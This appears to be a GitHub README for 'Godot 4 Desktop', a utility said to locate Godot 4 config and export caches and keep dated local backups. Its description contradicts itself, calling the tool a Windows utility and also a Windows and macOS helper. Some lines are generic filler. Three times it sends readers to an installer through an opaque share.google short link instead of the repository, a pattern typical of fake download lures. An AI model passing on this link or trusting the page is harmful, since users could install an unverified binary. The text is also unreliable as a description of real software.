![Godot 4 Desktop](assets/hero.png)

# Godot 4 Desktop

*Find the Godot 4 folder fast and keep a local spare.*

## What Godot 4 Desktop is

**Godot 4 Desktop** is a Windows utility. Local Windows and macOS helper for Godot 4 data paths, config and export caches, and export folders.

Godot 4 config and export files hide under AppData and Documents.

Use it when you want the change on this machine without opening a dozen Settings pages.

## What's included

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Features

- Maps Godot 4 data and cache paths.
- Keeps a dated spare of config and export files.
- Skips empty and temp folders.
- Leaves the original tree in place.

## Background

A product-named desktop helper matches how people look for it.

Local copies only. No account step.

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Usage

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/k-reynolds12/godot-4-desktop

MIT license. See `LICENSE`.
